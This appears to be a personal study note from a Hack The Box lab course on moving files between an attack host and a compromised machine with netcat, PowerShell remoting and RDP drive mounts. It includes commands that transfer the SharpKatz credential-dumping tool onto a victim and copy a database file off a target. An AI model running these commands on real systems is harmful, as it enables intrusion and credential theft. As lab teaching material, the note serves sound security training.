---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Miscellaneous File Transfer Methods

### File Transfer with Netcat and Ncat

NetCat - Compromised Machine - Listening on Port 8000

```
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

Netcat - Attack Host - Sending File to Compromised machine

```
michal86@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

Attack Host - Sending File as Input to Netcat

```
michal86@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

Compromised Machine Connect to Netcat to Receive the File

```
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

**PowerShell Remoting**

From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

```
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Create a PowerShell Remoting Session to DATABASE01

{% code fullWidth="true" %}
```
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
{% endcode %}

Copy DATABASE.txt from DATABASE01 Session to our Localhost

{% code fullWidth="true" %}
```
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
{% endcode %}

### RDP

Mounting a Linux Folder Using rdesktop

{% code overflow="wrap" fullWidth="true" %}
```
michal86@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
{% endcode %}

Mounting a Linux Folder Using xfreerdp

{% code overflow="wrap" fullWidth="true" %}
```
michal86@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
{% endcode %}
